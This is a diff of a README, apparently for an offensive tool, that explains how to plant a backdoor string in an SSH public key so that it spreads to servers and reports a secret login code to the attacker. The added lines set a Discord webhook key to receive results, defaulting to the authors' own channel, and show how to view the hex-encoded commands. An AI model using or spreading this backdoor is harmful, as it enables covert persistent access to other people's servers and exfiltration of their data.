@@ -17,10 +17,16 @@ Simply add the following **backdoor-string** to the beginning of the public key 
 
 Think of the ssh public key as a sort of `~/.bashrc` but with your backdoor inside, that gets propagaded by the user to various servers, and when triggered sends a secret login code back to us.
 
-Create your own **backdoor-string** by editing `ssh-key-backdoor.sh` and executing:
+Create your own **backdoor-string** by editing `ssh-key-backdoor.sh` (between `---BEGIN BACKDOOR---` and `---END BACKDOOR---`) and execute:
 ```console
+# Set your own discord key or the results will be reported to our Discord channel. Please.
+$ export KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
 $ ./ssh-key-backdoor.sh
+
+# Or view the clear commands without hex-encoding
+$ ./ssh-key-backdoor.sh clear
 ```
+
 
 (The same `command=`-trick can be used to trigger a canary or start other hidden services.)
 
